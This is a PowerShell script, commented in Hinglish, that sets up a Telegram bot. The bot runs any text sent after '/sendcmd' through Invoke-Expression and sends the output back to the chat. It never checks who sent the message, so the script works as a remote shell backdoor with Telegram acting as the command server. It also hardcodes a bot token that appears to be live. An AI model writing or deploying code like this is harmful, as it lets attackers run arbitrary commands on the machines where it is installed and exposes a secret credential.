# Bot ka token BotFather se lekar yahan daalein
$BotToken = "7748489422:AAGrYJ8e0kwARBhxgR1gtf8b8zEKlgoNJQ8"
$BaseUrl = "https://api.telegram.org/bot$BotToken"

# Function jo message bheje
Function Send-TelegramMessage {
    param (
        [string]$ChatID,
        [string]$Message
    )

    $SendMessageUrl = "$BaseUrl/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text    = $Message
    }

    try {
        Invoke-RestMethod -Uri $SendMessageUrl -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json -Depth 10)
    } catch {
        Write-Error "Message bhejne mein error aayi: $_"
    }
}

# Function jo shell commands execute kare aur output bheje
Function Handle-SendCmd {
    param (
        [string]$ChatID,
        [string]$Command
    )

    try {
        # Command ko execute karo aur output capture karo
        $Output = Invoke-Expression -Command $Command 2>&1 | Out-String

        if (-not $Output) {
            $Output = "Command successfully chal gaya, par koi output nahi aaya."
        }

        # Output ko chunks mein baato, taaki Telegram ka message size limit cross na ho
        $MaxMessageSize = 4096
        for ($i = 0; $i -lt $Output.Length; $i += $MaxMessageSize) {
            $Chunk = $Output.Substring($i, [Math]::Min($MaxMessageSize, $Output.Length - $i))
            Send-TelegramMessage -ChatID $ChatID -Message $Chunk
        }
    } catch {
        Send-TelegramMessage -ChatID $ChatID -Message "Command execute karte waqt error aayi: $_"
    }
}

# Function jo updates process kare
Function Start-BotListener {
    $Offset = 0

    while ($true) {
        $GetUpdatesUrl = "$BaseUrl/getUpdates?offset=$Offset"
        try {
            $Updates = Invoke-RestMethod -Uri $GetUpdatesUrl -Method Get
            foreach ($Update in $Updates.result) {
                $Offset = $Update.update_id + 1

                if ($Update.message -and $Update.message.text) {
                    $ChatID = $Update.message.chat.id
                    $Text = $Update.message.text

                    if ($Text.StartsWith("/sendcmd")) {
                        $Command = $Text -replace "/sendcmd ?", ""
                        if ($Command) {
                            Send-TelegramMessage -ChatID $ChatID -Message "Command execute ho raha hai: $Command"
                            Handle-SendCmd -ChatID $ChatID -Command $Command
                        } else {
                            Send-TelegramMessage -ChatID $ChatID -Message "Kripya /sendcmd ke baad command daalein."
                        }
                    } else {
                        Send-TelegramMessage -ChatID $ChatID -Message "Main sirf '/sendcmd' ka response deta hoon. '/sendcmd dir' try karein."
                    }
                }
            }
        } catch {
            Write-Error "Updates lene mein error aayi: $_"
        }

        Start-Sleep -Seconds 1
    }
}

# Bot listener ko start karo
Start-BotListener
